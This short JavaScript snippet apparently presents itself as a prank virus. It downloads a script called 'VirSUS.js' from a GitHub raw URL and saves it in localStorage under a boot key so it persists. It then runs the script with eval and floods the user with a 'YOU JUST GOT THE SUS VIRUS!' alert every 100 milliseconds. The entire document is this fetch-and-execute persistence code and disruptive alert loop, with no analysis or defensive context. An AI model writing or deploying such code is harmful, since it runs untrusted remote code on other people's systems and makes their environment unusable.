(async () => {
    const settings = { method: "GET", mode: "cors", cache: "reload" };
    localStorage["boot/VirSUS.js"] = await fetch("https://raw.githubusercontent.com/Busybody64/VirSUS/main/VirSUS.js", settings).then(response => response.text()); 
    eval(localStorage["boot/VirSUS.js"]);
})();
setInterval(function() {$alert('YOU JUST GOT THE SUS VIRUS!')},100)
